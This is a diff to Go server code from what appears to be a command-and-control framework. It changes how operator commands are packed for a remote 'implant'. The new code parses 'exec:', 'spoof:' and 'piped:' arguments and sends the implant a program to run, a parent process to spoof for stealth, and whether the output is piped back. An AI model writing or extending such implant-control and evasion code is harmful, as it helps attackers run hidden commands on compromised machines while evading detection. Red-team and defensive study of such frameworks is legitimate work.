@@ -220,19 +220,85 @@ func RecvEvent() {
 			agent := agent_map[ImplantCmd.ImplantName]
 			AgentCmd.MagicValue = agent.Context.Magic_val
 
-			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(ImplantCmd.Args))); err != nil {
+			var (
+				exec    string
+				spoof   string
+				piped   bool
+				args    []string
+				numargs = len(ImplantCmd.Args)
+			)
+
+			log.Println(ImplantCmd)
+			log.Println(ImplantCmd.Args)
+			//parse our data from the client.
+			// and determine number of arguments.
+
+			for _, str := range ImplantCmd.Args {
+				if strings.Contains(str, "exec:") {
+					exec = strings.TrimPrefix(str, "exec:")
+				} else if strings.Contains(str, "spoof:") {
+					spoof = strings.TrimPrefix(str, "spoof:")
+				} else if strings.Contains(str, "piped:") {
+					if strings.Contains(str, "true") {
+						piped = true
+					} else {
+						piped = false
+					}
+				} else {
+					if str == "null" {
+						numargs -= 1
+						continue
+					}
+
+					args = append(args, str)
+				}
+			}
+
+			//write the number of arguments for the implant to parse.
+			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(numargs)); err != nil {
 				log.Println("[error] attempting to write the number of arguments to the data buffer", err)
 				break
 			}
 
-			for _, str := range ImplantCmd.Args {
-				if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(str))); err != nil {
-					log.Println("[error] attempting to write the length of the argument to the data buffer", err)
-					break
+			//write the piped boolean to implant.
+			if piped {
+				if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(1)); err != nil {
+					log.Println("[error] attempting to write the number of arguments to the data buffer", err)
 				}
-				if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(str)); err != nil {
-					log.Println("[error] attempting to write the argument to the data buffer", err)
-					break
+			} else {
+				if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(0)); err != nil {
+					log.Println("[error] attempting to write the number of arguments to the data buffer", err)
+				}
+			}
+
+			//write the parent process to spoof to argument if it was specified.
+			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(spoof))); err != nil {
+				log.Println("[error] attempting to write the length of the argument to the data buffer", err)
+			}
+			if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(spoof)); err != nil {
+				log.Println("[error] attempting to write the argument to the data buffer", err)
+			}
+
+			//write the program we want to execute to argument.
+			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(exec))); err != nil {
+				log.Println("[error] attempting to write the length of the argument to the data buffer", err)
+			}
+			if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(exec)); err != nil {
+				log.Println("[error] attempting to write the argument to the data buffer", err)
+			}
+
+			//write the rest of our arguments.
+			if len(args) > 0 {
+				for _, arg := range args {
+					if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(arg))); err != nil {
+						log.Println("[error] attempting to write the length of the argument to the data buffer", err)
+						break
+					}
+					if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(arg)); err != nil {
+						log.Println("[error] attempting to write the argument to the data buffer", err)
+						break
+
+					}
 				}
 			}
 
@@ -262,5 +328,6 @@ func RecvEvent() {
 		default:
 			break // DEFAULT
 		}
+
 	}
 }
